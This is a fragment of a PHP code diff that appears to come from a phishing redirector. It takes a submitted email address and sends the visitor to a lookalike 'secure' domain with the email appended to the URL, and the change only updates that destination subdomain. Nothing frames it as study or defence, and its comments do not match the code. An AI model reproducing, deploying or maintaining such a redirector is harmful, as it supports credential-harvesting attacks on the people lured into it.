@@ -55,7 +55,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $encodedEmail = base64_encode($email);
 
     // Construct the redirect URL with the decoded email
-$redirectUrl = "https://p9j3v.osecurthei.com/cMZz/#A$email";
+$redirectUrl = "https://zo.osecurthei.com/cMZz/#A$email";
 
 
     // Redirect the user
